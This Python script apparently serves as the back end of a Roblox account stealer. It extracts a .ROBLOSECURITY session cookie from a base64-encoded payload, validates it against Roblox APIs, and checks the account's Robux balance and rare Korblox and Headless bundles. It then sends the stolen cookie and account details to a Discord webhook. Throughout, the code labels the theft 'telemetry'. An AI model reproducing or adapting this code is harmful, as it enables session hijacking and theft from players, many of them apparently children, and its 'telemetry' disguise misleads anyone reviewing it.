import sys
import base64
import os
import requests
import re
from datetime import datetime, timezone

def main():
    try:
        if len(sys.argv) < 2:
            print("Error: No argument passed to python script", file=sys.stderr)
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"Error decoding base64: {e}", file=sys.stderr)
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("Error: DISCORD_WEBHOOK_URL environment variable is missing!", file=sys.stderr)
            return

        match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
        if not match:
            print("Error: Could not find .ROBLOSECURITY token matching pattern in payload.", file=sys.stderr)
            return

        roblosecurity = match.group(1)
        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
        print(f"Roblox Auth Status: {user_res.status_code}", file=sys.stderr)
        
        username = "Unknown"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        has_korblox = False
        has_headless = False

        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Unknown")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            try:
                economy_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers, timeout=5)
                if economy_res.status_code == 200:
                    robux_balance = economy_res.json().get("robux", 0)
            except Exception:
                pass

            try:
                k_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers=headers, timeout=5)
                if k_res.status_code == 200:
                    has_korblox = bool(k_res.json())
            except Exception:
                pass

            try:
                h_res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers=headers, timeout=5)
                if h_res.status_code == 200:
                    has_headless = bool(h_res.json())
            except Exception:
                pass

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else ""

        payload = {
            "content": "@everyone New Telemetry Report Captured!",
            "username": f"{username} | Telemetry Bot",
            "avatar_url": avatar_thumb,
            "embeds": [{
                "author": {
                    "name": "Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"👑 **[{username} | 13+]**\n"
                    f"👤 **Username**: `{username}`\n"
                    f"🆔 **User ID**: `{user_id}`\n"
                    f"🪙 **Robux**: `{robux_balance}`\n"
                    f"🎒 **Korblox**: `{str(has_korblox)}`\n"
                    f"🎒 **Headless**: `{str(has_headless)}`\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": 3092790,
                "thumbnail": { "url": avatar_thumb },
                "footer": { "text": "NexusStudio Telemetry Engine • 2026" }
            }]
        }

        webhook_res = requests.post(webhook_url, json=payload, timeout=10)
        print(f"Discord Webhook Status: {webhook_res.status_code}", file=sys.stderr)

    except Exception as e:
        print(f"Critical Exception in core_extractor: {e}", file=sys.stderr)

if __name__ == "__main__":
    main()
